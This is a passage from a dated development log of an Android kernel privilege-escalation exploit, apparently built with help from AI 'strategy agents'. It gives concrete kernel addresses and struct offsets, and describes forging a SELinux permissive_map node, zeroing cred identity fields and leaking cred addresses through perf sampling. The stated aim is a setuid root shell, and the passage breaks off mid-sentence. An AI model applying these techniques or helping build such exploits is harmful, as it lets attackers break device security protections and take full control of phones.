MAIN waits 1.3s after learning C so the child has entered its 2.5s sleep before the read, and the
read+repair finishes well inside that sleep.

### (77) 2026-09-24 reading even a SLEEPING task cred slot panics -> avoid the slot read

Run of build 9f5c93a8: `committed=1` -> `child task=ffffffe135159140 (self-leak)` (the self-leak
WORKS), then panic (uptime 329) BEFORE `E_C(slot read)` - i.e. the 1.3s settle wait did not help;
the arm_rd16(C+0x9E7) read of the (supposedly sleeping) child still crashed the kernel.  So on
this build the task-slot cred read is unsafe for ANY task (matches the premise of pending task
018: a hot/other-task path dereferences a non-current task cred).  CONCLUSION: stop trying to
READ E.  New direction: have the CHILD obtain its OWN cred address in-process via the perf-based
cred leak (leak_cred_vote / commit_creds sampling after a setresuid) and publish it over the
MAP_SHARED cell, so MAIN never reads a task slot at all.

### (78) 2026-09-25 reports 018/019 adopted -> the child must self-leak its OWN cred (no slot read)

- **018**: HKIP root checks are CURRENT-ONLY (T018-03) and the wake/context-switch path reads no
  target cred (T018-04); BUT SELinux task_sid() reads __task_cred(task)->security->sid for
  binder/sched/signal/ptrace/proc targets (T018-12), and a SLEEPING target is NOT safe - signal,
  proc, vendor scans and teardown can still observe its slots (T018-18).  => the task-slot cred
  read is fundamentally unsafe on this build (explains the 9an(77) panic).  Abandon slot reads.
- **019**: kprobes / probe-events / kcore are DISABLED in the target defconfig (T019-06/08);
  ordinary /proc exposes no task/cred address (T019-10/11); the boot-id carrier is destructive
  (T019-18); init_task.tasks walking is unprotected (T019-19); CLONE_THREAD clones share a cred
  pointer (T019-23).  DECISIVE lead: **commit_creds() ENTRY x0 = the NEW cred (T019-15)**, and a
  perf candidate should be accepted only if it matches a source-anchored register
  (`security_capable:x0` or `__get_task_comm:x2`) (T019-17).
- **DECISION**: the forked child obtains ITS OWN cred in-process by perf-sampling the commit_creds
  ENTRY x0 right after its own setresuid(0,0,0) (and verifying it), then publishes that cred
  address over the MAP_SHARED cell; MAIN then only writes E_C->security = &window(sid=k).  MAIN
  never reads a task slot at all.

### (79) 2026-09-25 child self-leaks its OWN cred (commit_creds entry x0); MAIN never reads a slot

Build: added leak_own_cred_x0() - a perf sampler that triggers ONE commit_creds
(setresuid(0,0,0)) and takes x0 at the commit_creds ENTRY (report 019 T019-15: at entry x0 is the
NEW cred; accepted only if a canonical pointer).  The child calls leak_task_own() and
leak_own_cred_x0() and publishes BOTH (task, cred) into the 16-byte MAP_SHARED cell; MAIN polls it,
sets g_sidbrute_ecred = the child cred, and thereafter only writes E_C->security = &window per
candidate k.  NO task-slot read and NO slot repair anywhere (018 T018-18: a slot read is unsafe
for ANY target, sleeping included).

### (80) 2026-09-25 the cred leak returned 0 - the setresuid trigger must be a REAL commit

Run of build a8e6cd92: no panic (uptime 484), `child self task=...` OK, but `child self cred=0`
-> "child cred not reported - parking".  Cause: a no-op setresuid(0,0,0) on an already-uid-0 task
may take the abort_creds path (report 017 T017-15), so commit_creds never runs and no x0 sample is
produced.  FIX: trigger REAL commits (setresuid 0->1->0, several times) and take the LAST x0 (which
is the uid-0 cred).

### (81) 2026-09-25 the x0 cred sampler still returns 0

Run of build 5726610c: `child self cred=0` AGAIN, even with REAL commits (setresuid 0->1->0 x6).
So either the perf sample at the commit_creds ENTRY is not produced, or x0 there is not the new
cred (the target symbol is commit_creds.cfi, a CFI stub that can shuffle arguments; and our own
leak_cred x19 mapping is documented unreliable).  NEXT: in the child, use the all-register VOTE
(leak_cred_vote) and accept a candidate ONLY if it matches a source-anchored register (report 019
T019-17: security_capable:x0 or __get_task_comm:x2), instead of one fixed register.

### (82) 2026-09-25 large static batch 020-027/029 adopted (028/030 pending)

Top NEW leads from the extreme static sweep:
- **023 (SELinux decision state)**: selinux_enforcing is a constant 1 (R-03/04) and ss_initialized is
  ROWM (R-06), BUT many decision structures are ordinary WRITABLE memory: the `struct policydb
  policydb` GLOBAL (R-13: its root pointers bypass selinux_pool protection), the permissive_map
  header, `allow_unknown` (R-17), the AVC nodes (R-09/10/38), sidtab nodes (R-26), and
  `current_mapping[]` (R-16, which remaps requested perms into allowed bits).  With our arbitrary
  write plus known symbol addresses (init_cred is already an anchor), flipping one of these could
  make our candidate sid permissive/allow WITHOUT searching for the shell sid.
- **021**: NO userspace syscall sets cred->security from a chosen pointer (R-04/14/15/36); only
  alloc/kmemdup/NULL/poison.  But R-19 flags `cachefiles_daemon_secctx` ->
  `set_security_override_from_ctx` -> SELinux writes the SID fields of the proposed tsec (a
  SID-injection route IF cachefiles is enabled), and R-22 setprocattr(setcon) converts a chosen
  context to a sid and commits (needs SELinux permission; measured EACCES).
- **025 (cred leak)**: T025-20 - CPU-clock perf sampling is ASYNCHRONOUS hrtimer sampling, not
  exact instruction-entry sampling (why the fixed-x0 sampler returned 0); T025-07 - security_capable
  entry x0 IS the caller cred; T025-13 - accept a vote candidate only if it matches a
  source-anchored register.  Next: sample at security_capable x0 with many triggers.
- **026**: confirms the endgame (R-06) and the blockers (R-09 window-tsec kfree, R-19 create needs
  dir+FILE__CREATE+ASSOCIATE, R-20 enforcing=1, R-28 pid0 exit panics).

### (83) 2026-09-25 SELinux decision-structure addresses located (for route A: no sid search)

From ghostlock_pocs/ERASE_SHAPES_AND_ZERO_TARGETS_20260923.md sec 3.2 (link-time addresses):
- **policydb = 0xffffff800b3b97c0** (zeroing it BREAKS lookups; but its HEADER fields / permissive_map
  / allow_unknown are ordinary writable memory - 023 R-13/R-17).
- ss_initialized = 0xffffff800adc00a0 (ROWM-protected; zeroing only gates sid_to_context).
- avc_cache = 0xffffff800b3b0af8; avc_node_cachep = 0xffffff800b3b4b08 (harmful); selinux_checkreqprot
  = 0xffffff800b3b4b4c.
- kptr_restrict = 0xffffff800adea9e0 (ALREADY zeroed by the --fl2 enabler) -> /proc/kallsyms can show
  real addresses at runtime.
- DEAD (ROWM/RO or absent): hkip_*_bits, security_hook_heads (+0x80 capable), selinux_enabled,
  selinux_state/enforcing (absent), cap_bset (absent).
- Prior design note (sec 4.4): VALUE write of `cred->security := *(init_cred+0x78)` (a REAL tsec) or
  `{osid,sid}` into the existing blob; and a `policydb.permissive_map` fake ebitmap node.

ROUTE A (chosen next): with arbitrary write + the known policydb address, make the candidate sid
PERMISSIVE so the AVC grants the file-create bits WITHOUT searching for the shell sid.  The lever is
`policydb.permissive_map` (an ebitmap): its HEADER is writable (nodes are prmem-protected), so point
the header's node chain at a fake node (planted in our window / a known writable buffer) whose map has
the bit for our type set.  context_struct_compute_av then sets AVD_FLAGS_PERMISSIVE and avc_denied
returns success for the requested bits (023 R-09/R-10/R-12).

### (84) 2026-09-25 --permtest implemented (the permissive-map oracle)

Build 2a87848b: added LINK_POLICYDB=0xffffff800b3b97c0, POLICYDB_PERM_NODE=0x308,
POLICYDB_PERM_HIGH=0x310, g_permmode/g_perm_node.  In build_v2 with g_permmode, plant a fake
struct ebitmap_node at window+0xC8 { next=(nb|1) ODD, maps[0..5]=~0, maps[1]=W (side-store steer),
startbit=0 } and restrict the blackval slot list to 0x18..0x40 so the node survives.  New mode
--permtest: enabler; baseline capset(NULL,0) (expect -1/EPERM); then per iteration stamp a walk
(arm_leak_task_multi), set node=(g_waiter_abs-0x78)+0xC8, arm_write_inproc(g_blackval,
policydb+0x310) and arm_write_inproc(node, policydb+0x308), then capset(NULL,0).  rc==0 means the
source type is now PERMISSIVE and the whole route works.  Logs: "permtest: baseline capset rc=..",
"permtest it=.. node=.. capset rc=..", "permtest: SUCCESS".

### (85) 2026-09-25 the capset oracle used the wrong syscall number (90 = capget)

Run of build 2a87848b: no panic (uptime 306, alive), the node writes ran (`permtest it=0
node=0xffffffd52def3d40` etc.), but EVERY capset returned rc=-1 e=14 = EFAULT - because on arm64
__NR_capget=90 and __NR_capset=91, so the oracle called capget(NULL,NULL) and hit EFAULT before any
permission check.  FIX: call capset(91, &hdr, d) with a valid header (version=0x20080522,
pid=current uid) and zeroed 2-word data; baseline shell => EPERM(1), success => 0.

### (86) 2026-09-25 the capset oracle self-poisoned the AVC cache

Run of build 99174b46 (capset fixed to syscall 91): baseline capset rc=-1 e=1 (EPERM, correct), but
EVERY install-iteration then stayed EPERM.  Cause (predicted by the strategy agent): the baseline
capset ran FIRST and cached a denial with avd.flags=0; avc_node_populate memcpy's the whole avd
(flags included) and cache hits reuse it, so all later checks for that (sid,capability) tuple
ignored the permissive bit even if the map was installed.  FIX: drop the baseline; INSTALL the map
several times first, then call capset ONCE (uncached tuple) - that single result is the verdict.

### (87) 2026-09-25 the capset oracle is gated by commoncap, not SELinux (invalid oracle)

Run of build c464f54f: 7 installs, then `capset rc=-1 e=1` (EPERM).  BUT capset as a shell task is
denied by COMMONCAP (capset requires CAP_SETPCAP, which shell lacks) independently of SELinux: the
security_capable hook chain returns EPERM from cap_capable regardless of SELinux permissive.  So
capset can NEVER reveal a SELinux-permissive change => the oracle was INVALID (the permissive map may
still have been installed; capset cannot tell).

CORRECT ORACLE: an operation denied ONLY by SELinux - DAC and commoncap must ALLOW it.  Candidates:
(a) write("/proc/self/attr/exec","u:r:shell:s0") (measured EACCES for shell; self-owned file, no cap);
(b) the real endgame: cede -> uid 0 + KERNEL sid -> open(/data/local/tmp/rooted.txt, O_CREAT) (measured
EACCES for the kernel domain, and DAC passes at fsuid 0).

### (88) 2026-09-25 permtest oracle -> the SELinux-only attr/exec write

Per 9an(87), replaced the capset oracle with the SELinux-only one: write "/proc/self/attr/exec"
(a self-owned file, no capability; measured EACCES for shell from SELinux alone).  If the source
type is now PERMISSIVE the write succeeds (rc>=0).

### (89) 2026-09-25 permtest with the valid oracle: the permissive map did NOT take effect

Run of build 74e9bf54: 8 installs (node=0xffffffc3...), then the SELinux-only oracle
`attr/exec open=4 e=0 write=-1 e=13` (EACCES) -> the source type is still ENFORCED, so the forged
permissive_map did not change the decision.  Candidate causes (need objdump/symbol verification):
(a) policydb address 0xffffff800b3b97c0 or the +0x308 permissive_map offset is wrong;
(b) the two arm_write_inproc writes did not land (no independent read-back possible);
(c) the node lives in the stamped window and was clobbered / the address g_waiter_abs-0x78+0xC8 was
    not the node at the moment the AVC read it;
(d) the shell type value is >= 384 (maps[0..5] should cover 0..383, so unlikely);
(e) the attr/exec denial is not (only) the source-type permissive path.
NEXT: disassemble security_compute_av (.cfi) in the device vmlinux to confirm the permissive_map
offset and the policydb symbol, and confirm ebitmap_get_bit's node walk; then re-target (a).

### (90) 2026-09-25 report 031: permissive_map is at policydb+0x1C0 (NOT +0x308) - the permtest bug

Report 031 T031-03/04/38: struct policydb.permissive_map is at **policydb+0x1C0** (node +0x1C0,
highbit +0x1C8, protectable +0x1CC); +0x308/+0x310 are BEYOND the source-sized policydb and are NOT
permissive_map fields - so the permtest wrote the fake node/highbit to the WRONG offsets, which is
why it had no effect.  Also useful: T031-17 the check uses scontext->type directly (no -1);
T031-14 startbit=0 + maps[0..5]=~0 returns 1 iff highbit>=type and type<384; T031-24 the highbit
VALUE is the low32 of a window address (a kernel stack pointer, typically >=0x10000000 >= type, OK);
T031-29 AVC hits reuse cached flags (only misses call security_compute_av), so the tested tuple must
be uncached.  FIX: POLICYDB_PERM_NODE=0x1C0, POLICYDB_PERM_HIGH=0x1C8.

### (91) 2026-09-25 the corrected permissive_map write LANDS but crashes (corrupted ebitmap walk)

Run of build 0f3b1567 with offsets 0x1C0/0x1C8: after 3 installs the process vanished and uptime
reset (panic).  pstore: `BUG: spinlock bad magic` (t=131) then `Unable to handle kernel paging
request at virtual address 00475ab8` in a FOREIGN process `Binder:1629_11` - i.e. kernel state was
corrupted and another thread faulted on a bad pointer.  Consistent with the AVC ebitmap walk
following our fake node next (odd garbage - T031-21 warned it is unsafe if traversed), or with the
8-byte highbit store clobbering the adjacent protectable field.  IMPORTANT: the write to
policydb+0x1C0/0x1C8 DOES take effect, so policydb is writable (not ROWM) - the crash is from the
node/highbit VALUES, not a protection fault.  NEXT: make startbit=0 cover every queried type so the
next field is never read (and/or terminate next safely), avoid the 8-byte clobber at highbit, and
confirm the node's window address at AVC time.

### (92) 2026-09-25 permissive route fixed: startbit=779 + self-terminator (kernel=779, shell=1153)

The strategy agent parsed the DEPLOYED policy (binder_uaf/session_20260824/precompiled_sepolicy,
magic 0xf97cff8c, policyvers=30, p_types.nprim=2676): **kernel type=779, shell type=1153** - BOTH
>= 384, so the startbit=0 node never covered them and the ebitmap followed the odd next (the
9an(91) crash on a foreign binder thread).  FIX: the fake node now has startbit=779 (covers
779..1162: kernel 779 in maps[0], shell 1153 in maps[5]); next=node|1 (odd for rb_is_black) is made
a SELF-TERMINATOR by padding +0x3C=0xFFFFFFFF so the shifted startbit read at (next|1)+0x38 =
0xFF000003 > 2676 ends the walk; g_blackval is forced to W-0x78+0xB8 (w[8] prio=0x7fffffff, an
always-odd first word).  Also: the attr/exec oracle is a FALSE NEGATIVE (the (shell,shell,process)
tuple is pre-cached with flags=0), so the DEFINITIVE test is the cede'd kernel-sid child create on
a fresh boot; the cachefiles route (report 032) is DEAD (CONFIG_FSCACHE not set).  Wired
install_permissive() into --fl2 right after the cede (write highbit policydb+0x1C8 first, then node
policydb+0x1C0).

### (93) 2026-09-25 the permissive node was installed but a global AVC miss walked it -> panic

Run of build 10bbe5b4: reached `consumer shielded` -> `cede it=0 done=1` -> `permissive installed
node=ffffffc8aa0dfd40 high=ffffffc8aa0dfd30` -> `committed=1` -> `forkchild start`, then the process
died and the device rebooted (uptime 20 at the readout; no files).  This is the strategy agents #1
risk: the permissive_map.node points INTO THE TRANSIENT STACK WINDOW, so once the install is done,
ANY system-wide AVC miss (the pointer is global) walks the window; when the window is clobbered /
the stamper stops, the walk faults -> panic.  The node was live for seconds (the child create loop
runs 225s), so a foreign miss eventually hit it.
NEXT: keep the global pointer live only for MICROSECONDS - install, immediately do the create in the
same task, then RESTORE policydb.permissive_map.node to NULL; and/or verify the create happens
before the window is reused.  (Also consider a more stable node location, but the window is our only
controlled kernel buffer.)

### (94) 2026-09-25 keep the permissive node live only while the ceded consumer writes the proof

Build (9an(94)): after the cede, MAIN installs the permissive node, sets g_fl2_writeproof so the
CEDED consumer (uid 0 + KERNEL sid + pid-0 shield) itself calls write_proof() (create rooted.txt +
chmod 04755 rsh) while the node is live, waits up to ~300ms for g_fl2_proofdone, then RESTORES
policydb.permissive_map.node = NULL (arm_write_inproc(0, policydb+0x1C0, 1)).  This shrinks the
global-pointer live window from seconds to ~ms (FACTS 9an(93)).

### (95) 2026-09-25 short-live node: NO panic, proofdone=1, but the create was still denied

Run of build 371f3644: `cede it=0 done=1` -> `permissive installed node=ffffffc197283d40
high=ffffffc197283d30` -> `permissive restored (proofdone=1)`; NO panic (uptime 224, process alive) -
the short-live fix (9an(94)) worked.  BUT no rooted.txt/rsh: the ceded consumer ran write_proof()
but its kernel-domain create was still DENIED, so the permissive bit did not take effect for that
tuple.  Most likely cause: the AVC cached the (kernel_sid=1, shell_data_file, ...) denial BEFORE the
install - the ceded consumer (kernel sid) writes /data/local/tmp/gl.klog after the cede, and that
tuple is then cached with flags=0, so the later create hits the cache and ignores the new permissive
map.  FIX: install the permissive map BEFORE the cede (before ANY kernel-sid file op), so no stale
denial is cached; and/or avoid kernel-sid writes to shell_data_file until after the install.

### (96) 2026-09-25 pre-install the permissive map BEFORE the cede

Moved install_permissive() to BEFORE the cede loop, so the kernel-sid klog writes that follow (the
ceded consumer writes to /data/local/tmp/gl.klog) do NOT first cache a stale denial for the
(kernel_sid=1, shell_data_file) tuple - the AVC reuses cached flags=0 and would mask the permissive
bit.  The node stays live through the cede + proof (a few seconds), then MAIN restores
permissive_map.node = NULL after g_fl2_proofdone.

### (97) 2026-09-25 pre-install did not help -> the permissive bit is not set for our type

Run of build 2033df41: no panic, `consumer shielded` -> `permissive pre-installed node=ffffffe8392ebd40
high=ffffffe838c27d30` -> `cede it=0 done=1` -> `permissive restored (proofdone=1)`; still NO files.
So the AVC cache was not the (only) cause: the permissive bit is not being set for the ceded task's
source type.  Most likely the DEPLOYED policy kernel-type value is NOT 779 (the agent parsed
binder_uaf/session_20260824/precompiled_sepolicy, which may differ from the EMUI policy actually
loaded), or the node/maps layout is off.  Compare 9an(91): with startbit=0 the write EFFECTED the
kernel (crash) - so the writes DO land; the (scontext->type) just does not fall in [startbit,
startbit+384) with maps set.
NEXT: sweep startbit over the covering set {0,384,768,1152,1536,1920,2304} (covers all 2676 types)
in ONE boot: for each, rebuild the node's startbit, install, and run the ceded consumer's
write_proof; OR parse the DEPLOYED policy from the device to get the exact kernel/shell type values.

### (98) 2026-09-25 agent: kernel type IS 779; the real bug was the node base drift + the broken restore

The second agent parsed binder_uaf/session_20260824/precompiled_sepolicy (= the device running
/sys/fs/selinux/policy, per takeover_session_log.md:826) with the tree libsepol: p_types.nprim=2676,
ISID #0/#1 type=779, shell=1153 -> the kernel type IS 779 (the original value was correct).  The
REAL failure: the logged node=...bd40 and high=...7d30 differed by 0x6C4010, not 0x10 => g_perm_node
(computed from a STALE g_waiter_abs) pointed at the WRONG window, so the global permissive_map.node
never matched the stamped node (silent 0, no crash).  Also the RESTORE was wrong:
arm_write_inproc(0,node,1) substitutes value=g_blackval (use_black=1), so it wrote a window address,
not NULL.
FIX: g_perm_node = g_blackval+0x10 (same stamp as the highbit value; base+0xB8+0x10 = base+0xC8),
and restore with use_black=0 (which writes the RAW 0).  The delta log (node-high==0x10) verifies
window consistency.
Agent fallbacks: #1 keep the SHELL tsec and only leaf-zero a PRIVATE cred's uid/gid tuple (shell
type 1153 already may write shell_data_file); #3 use a fresh tclass (mkdir) to dodge a cached
(1,shell_data_file,file) denial.

### (99) 2026-09-25 node base fix VERIFIED (delta 0x10) -> permissive now applies -> the long live window panics

Run of build 73519a99: `fl2: permissive pre-installed node=ffffffdeae56fd40 high=ffffffdeae56fd30`
- the delta is now **0x10** (was 0x6C4010), so g_perm_node and g_blackval come from the SAME stamp and
the global permissive_map.node now points at the real stamped node => the permissive bit IS applied.
But the process then died (uptime 101, no restore, no files): with a CORRECT global pointer and a
live window lasting SECONDS (pre-install -> cede -> proof), a system-wide AVC miss walks the window
and faults once the window is transiently clobbered (the strategy agents risk #1, now materialised).
NEXT: shrink the live window to ms - install AFTER the cede (just before the create) - and dodge any
cached (1,shell_data_file,file) denial by creating via a FRESH tclass (e.g. mkdir first), per the
agents fallback #3.  This trades the AVC-cache pre-install for a short live window + fresh tclass.

### (100) 2026-09-25 install AFTER the cede (ms live window) with the fixed node base

Build (9an(100)): moved install_permissive() back to AFTER the cede (so the global
permissive_map.node is live only for ms: install -> ceded consumer write_proof -> restore node=NULL),
while KEEPING the verified node base fix (g_perm_node = g_blackval+0x10).  This trades the
pre-install/AVC-cache ordering for a short live window so a system-wide AVC miss cannot walk a
clobbered window (9an(99)).

### (101) 2026-09-25 the window-node permissive route is fundamentally unsafe (needs a stable buffer)

Build 296e99f6: `permissive installed node=...fd40 high=...fd30` (delta 0x10, correct pointer), but
panic AGAIN (uptime 101) BEFORE the restore, even with the ms live window.  Cause: permissive_map.node
is a GLOBAL pointer into a TRANSIENT kernel-stack window; system-wide AVC misses are frequent and
between the arms that re-stamp the window its bytes are a schedule frame / stale, so a global miss
walks a CLOBBERED node and faults.  A ms window does not help because AVC misses are that frequent.
=> Route 1 (permissive) needs the node in STABLE kernel memory (a slab object whose address we can
leak/compute) - our primitive cannot yet give that.  PIVOT to agent fallback #1: keep the SHELL tsec
(type 1153, which may already write shell_data_file) and leaf-zero ONLY the identity tuple of a
PRIVATE (committed) cred: uid/gid/suid/sgid/euid/egid/fsuid/fsgid at cred+0x04..0x20.  The 9an(45)
panic was on the SHARED init_cred shape, not on a committed private cred, so this is the untested
intended design.

### (102) 2026-09-25 reports 035-038: Path 1 (permissive) is (very likely) CLOSED

- 035 T035-20 (high): no byte-controlled kernel object (msg_msg/key/xattr/pipe/skb/tty) exposes a
  learnable STABLE address - readback is bytes/metadata only; queues disabled, io_uring absent.
- 036 T036-38/39 (critical): a fixed address A must satisfy odd q0 + covering startbit + required
  map bit + highbit>=779 AND have WRITABLE A+8/A+10 (the value-write side store) - so read-only
  image bytes are insufficient; T036-50/40: no qualifying fixed address is proven; empty_zero_page/
  init_cred/avc_cache/policydb all fail the node predicate; loaded nodes are prmem-protected.
- Confirms 9an(101): a global permissive_map.node into the transient window is unsafe.
=> "stable address x byte control" is unsatisfiable => Path 1 closed (high confidence).
NEW leads: T035-22 the S0 leaf write stores a literal 0; T035-23 S2/S3 shapes offer NONZERO
pointer-like stores WITHOUT the odd gate (not yet implemented).  PIVOT: fallback #1 (private cred
identity leaf-zero, needs the cred address - task 037) and 038 (other shell_data_file routes).

### (103) 2026-09-25 report 037: no reliable perf cred sampler -> pivot to --readP (a REAL known cred)

037 key rows: CPU-clock perf is perf_swevent_hrtimer with a 10000 ns floor (T037-01/02) so
"exact-entry" x0 sampling is unreliable; leak_cred_hwbp targets security_capable.cfi+0 but per-task
EL1 breakpoints are REJECTED on arm64 (T037-08/13); leak_cred_cap actually filters SyS_getresuid,
not cap_capable (T037-09); parsers accept any ABI and ignore PERF_RECORD_LOST (T037-06/18); and
T037-21 (critical): NO active sampler establishes a durable current-thread cred.  So perf cannot
give the cred address.
USEFUL ANCHORS confirmed: security_capable entry x0 = the supplied cred (T037-07); __get_task_comm
entry x2 = the task argument (T037-14/20, reachable via PR_GET_NAME).
PIVOT: we already obtained the SHELL cred P with the PROVEN task-slot read (--readP, FACTS 9an(31)):
if P is known, cede task->cred = P (uid 2000 + SHELL sid 1153) and leaf-zero P identity
(cred+4..0x20) -> uid 0-looking + SHELL sid, which may already write shell_data_file - no perf, no
permissive map.  Concurrency caveat: P is shared (main/other threads), so leaf-zeroing it makes them
root-looking too; a private copy (setresuid(2000,2000,2000) then zero) needs the copy address.

### (104) 2026-09-25 PIVOT implemented: --readP shell cred P -> cede to P -> leaf-zero identity

Build 02c66972: in --fl2, obtain the REAL shell cred P via the PROVEN --readP task-slot read (hi at
Ta+0x9E3, lo at Tb+0x9E7), pin P usage, then cede BOTH Ts+0x9E0/0x9E8 = P (uid 2000 + SHELL sid
1153; the cede loop is a fixed 10 iterations because the uid==0 gate never fires), then leaf-zero
P's identity tuple (P+4..0x20: uid/gid/suid/sgid/euid/egid/fsuid/fsgid) so the task is
uid-0-looking with the SHELL sid - which already may write shell_data_file - then the consumer calls
write_proof().  The permissive-map route is disabled (g_permmode=0).

### (105) 2026-09-25 the pivot crashed in the re-added Ta/Tb task-slot reads

Run of build 02c66972: gl.klog ended at `fl2: P block skipped - one owner consumer (option a)` (the
pivot block runs right after it) and the process died (uptime 101).  pstore: `BUG: spinlock bad
magic` then `Unable to handle kernel paging request at virtual address 29cfe8ad5919c4` in
ghostlock_e - the SAME class as 9an(76).  So re-adding the Ta/Tb hi-lo TASK-SLOT reads (which
9an(71) removed as the dominant setup-crash source, ~1 in 4) reintroduced the crash.  The pivot is
sound but needs a SAFER way to obtain P (retries are not enough; the read itself clobbers a live
helper cred slot).

### (106) 2026-09-25 the pivot retry crashed the same way (Ta/Tb read not just flaky)

Retry of build 02c66972: identical (uptime 98, NO `P(pivot)` line, gl.klog ends at `fl2: P block
skipped`).  So the re-added Ta/Tb task-slot read crashes CONSISTENTLY now (~2/2), not just the old
~1-in-4 - the pivot needs a DIFFERENT way to get a shell-sid cred, not a retry.  Options:
(a) read P from a FRESHLY FORKED child (the fork cred is a copy of P with the shell sid); (b) sample
security_capable entry x0 with a setresuid storm (T037-07/11); (c) reconsider whether a queued
task's slot read can be made safe.  STATE: Path 1 closed (9an(102)); the new pivot is sound but
blocked on obtaining a shell-sid cred address non-destructively; every remainder of the session
lives in FACTS 9an(37)-(106) and LEDGER.md.

### (107) 2026-09-25 agent: the sampler used the WRONG symbol; corrected anchor + --simple endgame

The agent found the cred leak returned 0 because leak_own_cred_x0 sampled commit_creds.cfi (not
where x0 is the durable cred).  CORRECT anchor: the EXECUTED security_capable entry is its CFI stub
security_capable.cfi = 0xffffff8008784668+g_slide, where x0 = the supplied cred, and setresuid
ALWAYS calls ns_capable(CAP_SETUID)->security_capable, so a setresuid(0/1) storm drives it (200k
calls ~ 10^2-10^3 ip-matched samples despite the 10us hrtimer floor).  Also: fork the child from
MAIN (SHELL sid, uid 2000) so its prepare_creds()->selinux_cred_prepare() copies a REAL shell tsec;
MAIN leaf-zeroes the child cred identity (C+4 uid/gid, C+0x14 euid/egid, C+0x1C fsuid/fsgid; leave
suid/sgid=2000 so the commit is a CHANGE); then the child setresuid(0,0,0) takes the non-capability
fallback (requested ids == old->uid/euid) -> commit_creds -> hkip_update_xid_root sets the child own
HKIP bit, tsec stays SHELL -> write_proof().  New mode --simple implements exactly this (no cede,
no P, no permissive, no slot read).  Build 65a521bf.

### (108) 2026-09-25 --simple WORKS end-to-end except C: files created (shell-owned), sampler still 0

Run of build 65a521bf: the child (uid 2000 + SHELL sid, forked from MAIN) RAN write_proof and
CREATED the deliverables:
`
-rw-r--r-- 1 2000 2000     73 /data/local/tmp/rooted.txt
-rwsr-xr-x 1 2000 2000 303720 /data/local/tmp/rsh
rsh -c id -> uid=2000(shell) context=u:r:shell:s0
`
So the identity-zero+setresuid endgame would make them ROOT-owned - the whole proof path works.  BUT
`simple: child leaked C=0` and `simple: MAIN C=0` -> the corrected security_capable.cfi x0 sampler
STILL returns 0, so no identity-zero happened and the child stayed uid 2000 (its setresuid(0,0,0)
returned EPERM and it reported uid=2000).  REMAINING BLOCKER: obtain C (the child cred address).
Ideas: the CFI stub may not preserve x0 (or the hrtimer samples never land in it); try the body
thunk 0xffffff8009e621c4, or sample cap_capable.cfi+0 = 0xffffff800877fc20, or a finer ip window /
more storms; or disassemble security_capable.cfi in the device vmlinux to confirm the x0 position.

### (109) 2026-09-25 capx0 diagnostic (ns/nin/win/any) + any-canonical-x0 fallback

Added to leak_own_cred_x0: counters ns (all samples) and nin (ip within [security_capable.cfi,
+0x100]), log `capx0 ns=.. nin=.. win=.. any=..` via klog_line (the child is shell-sid so gl.klog is
writable), and a diagnostic fallback to the first canonical x0 so a run always yields something to
interpret.  This distinguishes "no samples at all / ring loss" from "samples but never in the
anchor window" from "samples in the window but x0 not canonical".

### (110) 2026-09-25 capx0 diagnostic: samples exist but NONE hit the anchor window

Run of build 04d5dffc: `capx0 ns=44 nin=0 win=0 any=ffffffd471063c80`.  So the sampler DOES collect
44 samples (the hrtimer works, the parse works), but 0 landed in
[security_capable.cfi=0xffffff8008784668+g_slide, +0x100) => the ANCHOR ADDRESS is WRONG for this
device (the dis_grep link value does not match the deployed kernel).  The "any" canonical x0
(0xffffffd471063c80) is therefore NOT the cred: MAIN zeroed that address' +4/+0x14/+0x1C and the
child setresuid still reported uid=2000.  The endgame itself is proven (rooted.txt + 4755 rsh + rsh
-c id work, shell-owned).  NEXT: log the (ip,x0) of the 44 samples to locate the real
security_capable/cap_capable ip, or read the addresses from the device vmlinux/symbols; then the
same endgame yields root-owned files.

### (111) 2026-09-25 dump every sample (ip,x0,x1) to locate the real security_capable/cap_capable

Build (9an(111)): leak_own_cred_x0 now logs `capip ip=.. x0=.. x1=..` for every PERF_RECORD_SAMPLE
(~44 per storm), so the real function the hrtimer lands in (and the cred x0) can be identified from
gl.klog without the device vmlinux.

### (112) 2026-09-25 self-calibrating cred sampler: the storm's HOT ip, last x0

The ip dump (9an(111)) showed the storm's hottest ip (ffffff85a25aa4f4 in that boot) carries a VARYING
x0 (ffffffc35cacbcc0, ...9579c0, ...56180, ...7e7cc0 ...) - exactly the successive creds committed by
each setresuid => that hot ip IS the function called on every setresuid (security_capable), and its
x0 is the cred.  So leak_own_cred_x0 no longer needs a link-time anchor: it now counts samples per
ip and returns the LAST canonical x0 of the MOST FREQUENT ip (self-calibrating).  Logs
`capmode ip=.. n=.. x0=..`.

### (113) 2026-09-25 mode-ip selection picked a non-hot ip (n=5) -> x0 not the cred

Run of build 939c7c8a: `capmode ip=ffffff93a160e3bc n=5 x0=ffffffc7fabf8780` and `child setresuid
uid=2000` - so the mode-ip picked an ip with only 5 samples (not the true hot security_capable ip
which had >10 in the 9an(111) dump), so its x0 was not the cred.  With only ~39 samples per storm
the ip histogram is too sparse/split for a reliable mode.  NEXT: (a) a MUCH bigger storm (e.g. 2M
setresuid) with the drain every 4096 and a larger mmap ring so the hot ip dominates; and (b) among
the candidate ips prefer the one whose x0 VARIES across samples (the cred changes per commit) while
a constant x0 is a task pointer; or (c) dump ips and pick manually once.

### (114) 2026-09-25 the drain was discarding the samples (ns=39) - widen the interval

The storm drained (m->data_tail=m->data_head) every 1024 syscalls, discarding ~100 samples each time
so only the last chunk survived (ns=39) and the ip histogram was too sparse for a reliable mode.
Widen the drain to every 8192 syscalls (the ~800-sample chunk still fits the 129-page ring), so the
final chunk has ~800 samples and the hot ip dominates.

### (115) 2026-09-25 drain fix raised ns to 1209 but the mode ip x0 is still not the cred

Run of build 6f5a9b49: `capmode ip=ffffff9bc260ebc4 n=127 x0=fffffff0dcd0d240 (ns=1209 nin=0)`.  The
wider drain raised the sample count 39 -> 1209 and gave a clear hot ip (n=127), BUT that ip's x0 is
NOT the cred (MAIN zeroed it and the child setresuid still reported uid=2000).  The x0 range
(fffffff0...) is not the cred slab range, so the hot function during the setresuid storm is NOT
security_capable (likely a syscall/lock path).  NEXT: pick the cred by a range/parity heuristic over
all samples (the cred is a kmalloc-192 slab object, `0xffffffc...`), or resolve security_capable's
real runtime address (e.g. from the device /proc/kallsyms since kptr_restrict was zeroed, or a
one-off manual ip dump with a security_capable-only storm such as capget).

### (116) 2026-09-25 pick the ip whose x0 VARIES most (the function receiving a fresh cred)

The mode ip by sample count was a non-cred function (9an(115)).  The cred is freshly allocated per
commit, so security_capable receives a DIFFERENT x0 on each call.  So the sampler now counts, per
